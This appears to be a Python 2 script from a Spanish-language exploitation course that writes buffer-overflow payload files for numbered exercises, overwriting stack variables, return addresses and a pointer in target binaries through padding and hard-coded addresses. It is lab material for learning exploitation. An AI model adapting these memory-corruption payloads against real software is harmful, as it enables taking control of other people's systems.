from struct import pack
'''
#ej1
f = open('ej1','wb')
f.write('A'*80+'DCBA')

#ej2
f = open('ej2', 'wb')
f.write('A'*70 + '\x04' + '\x03' + '\x02' + '\x01')

#ej3
f = open('ej3', 'wb')
f.write('A'*68+pack('<i', 0x0804845a))

#ej 1 y 3 
f = open('ej1y3', 'wb')
f.write('A'*68+pack('<i', 0x0804845a)+'A'*8+'DCBA')

#ej 2 y 3
f = open('ej2y3', 'wb')
f.write('A'*68+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a))

#ej 1,2 y 3 
f = open('ej1_2y3', 'wb')
f.write('A'*68+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a))
f = open('ej4', 'wb')
f.write('\x01\x04\x00\x80' + '\x42\x00\x00\x00' * 1024 + '\x01\x00\x00\x00')

f = open('ej1y4','wb')
f.write('\x01\x04\x00\x80'+'A'*76+'DCBA'+'\x42\x00\x00\x00' * 1004 + '\x01\x00\x00\x00')
'''
#ej 1 y 3 
f = open('ej1_3y4', 'wb')
f.write('\x01\x04\x00\x80'+'A'*64 + pack('<i', 0x0804845a)+'A'*8 +'DCBA'+'\x42\x00\x00\x00' * 1004 + '\x01\x00\x00\x00' )

#Ej6
#f = open('ej6','wb')
#f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 376 + '\x14\xa0\x04\x08')

#Ej 6 y 1
#f = open('ej6y1','wb')
#f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A'*72 + 'DCBA' + 'A' * 300 + '\x14\xa0\x04\x08')

#Ej 6 y 2
#f = open('ej6y2','wb')
#f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 62 + '\x04\x03\x02\x01' + 'A' * 310 + '\x14\xa0\x04\x08')

#Ej 6 y 3
#f = open('ej6y3','wb')
#f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A'*60 + '\x5a\x84\x04\x08' + 'A' * 312 + '\x14\xa0\x04\x08')

#Ej 6_1y2
#f = open('ej6_1y2','wb')
#f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 62 + '\x04\x03\x02\x01' +'A'* 6+ 'DCBA' + 'A' * 300 + '\x14\xa0\x04\x08')

#Ej 6_1y3
#f = open('ej6_1y3','wb')
#f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 60 + '\x5a\x84\x04\x08' +'A'* 8 + 'DCBA' + 'A' * 300 + '\x14\xa0\x04\x08')

#Ej 6_2y3
#f = open('ej6_2y3','wb')
#f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 60 + '\x5a\x84\x04\x08' +'A'* 6 +  '\x5a\x84\x04\x08' + 'A' * 302 + '\x14\xa0\x04\x08')
